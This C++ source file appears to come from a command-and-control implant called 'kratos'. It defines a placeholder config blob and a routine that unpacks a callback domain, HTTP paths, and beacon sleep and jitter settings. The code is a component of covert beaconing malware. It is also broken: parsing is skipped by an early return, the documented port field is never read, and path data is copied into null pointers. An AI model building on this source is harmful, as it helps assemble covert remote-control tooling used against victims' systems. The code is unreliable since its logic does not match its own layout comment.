#include "config/config.h"
#include "net/net.h"


PBYTE GetConfig() {
	return (PBYTE)"\x11\x22\x33";
}


INT32 GetConfigSize() {
	return 3;
}



/*
	[Domain len]  4 Bytes
	[Domain str]  N Bytes
	[Domain port] 4 Bytes
	[Total Paths] 4 Bytes
	for each path
		[Path len]    4 Bytes
		[Path str]    N Bytes
	[Sleep time] 4 Bytes
	[Jitter %]   4 Bytes
*/
BOOL ParseConfig( ) {
	return TRUE; // just for now till builder done
	PCHAR Paths[ 5 ] = { 0 };

	packager->NewUnPacker( GetConfig( ), GetConfigSize( ) );

	auto DomainLen = packager->UnPack4( );
	PCHAR Domain = ( PCHAR )packager->UnPackBytes( DomainLen );
	auto TotalPaths = packager->UnPack4( );

	for (INT32 i = 0; i < TotalPaths; i++) {
		auto pathLen = packager->UnPack4( );
		PCHAR Path = ( PCHAR )packager->UnPackBytes( pathLen );
		utils::mem::memcpy(Paths[i], Path, pathLen);
	}

	if ( ! net->SetHttpConfig( TotalPaths, Domain, Paths ) ) { 
		return FALSE; 
	}

	kratos->settings.Sleep  = packager->UnPack4( );
	kratos->settings.Jitter = packager->UnPack4( );
	return TRUE;
}